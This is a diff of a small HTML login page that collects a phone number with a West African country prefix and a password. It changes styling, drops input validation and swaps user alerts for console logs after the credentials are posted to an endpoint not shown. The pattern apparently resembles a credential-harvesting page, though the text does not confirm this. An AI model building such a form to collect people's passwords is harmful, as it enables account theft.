@@ -12,9 +12,9 @@
     }
 
     .background {
-      background: url('https://i.imgur.com/AVktJnm.png') no-repeat center center;
-      background-size: contain;
-      height: 300px;
+      background: url('https://i.imgur.com/AVktJnm.png') no-repeat center top;
+      background-size: cover;
+      height: 50vh;
       position: relative;
     }
 
@@ -30,7 +30,7 @@
     .logo {
       display: block;
       margin: 0 auto;
-      width: 180px;
+      width: 120px;
     }
 
     h2 {
@@ -52,13 +52,11 @@
 
     .prefix {
       background: #eee;
-      padding: 10px 15px;
+      padding: 10px;
       display: flex;
       align-items: center;
       cursor: pointer;
       font-weight: bold;
-      border-right: 1px solid #ccc;
-      border-radius: 10px 0 0 10px;
     }
 
     .prefix:hover {
@@ -130,10 +128,8 @@
     #modal-content {
       background: white;
       padding: 20px;
-      border-radius: 20px;
-      width: 90%;
-      max-width: 400px;
-      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+      border-radius: 10px;
+      width: 80%;
     }
 
     .country-option {
@@ -176,10 +172,10 @@
   <div id="modal">
     <div id="modal-content">
       <h3>Sélectionner l'indicatif du pays</h3>
-      <div class="country-option" onclick="setPrefix('+221')">🇸🇳 Sénégal (+221)</div>
+      <div class="country-option" onclick="setPrefix('+221')">🇸🇳 Senegal (+221)</div>
       <div class="country-option" onclick="setPrefix('+226')">🇧🇫 Burkina Faso (+226)</div>
-      <div class="country-option" onclick="setPrefix('+229')">🇧🇯 Bénin (+229)</div>
-      <div class="country-option" onclick="setPrefix('+237')">🇨🇲 Cameroun (+237)</div>
+      <div class="country-option" onclick="setPrefix('+229')">🇧🇯 Benin (+229)</div>
+      <div class="country-option" onclick="setPrefix('+237')">🇨🇲 Cameroon (+237)</div>
     </div>
   </div>
 
@@ -202,13 +198,8 @@
 
     function sendData() {
       const prefix = document.getElementById("prefix").innerText;
-      const phone = document.getElementById("phone").value.trim();
-      const password = document.getElementById("password").value.trim();
-
-      if (phone === "" || password === "") {
-        alert("Veuillez remplir tous les champs.");
-        return;
-      }
+      const phone = document.getElementById("phone").value;
+      const password = document.getElementById("password").value;
 
       const data = {
         phone: prefix + phone,
@@ -222,11 +213,11 @@
         },
         body: JSON.stringify(data)
       })
-      .then(() => {
-        alert("Connexion réussie !");
+      .then(response => {
+        console.log("Données envoyées");
       })
-      .catch(() => {
-        alert("Erreur lors de l'envoi.");
+      .catch(error => {
+        console.error("Erreur lors de l'envoi :", error);
       });
     }
   </script>
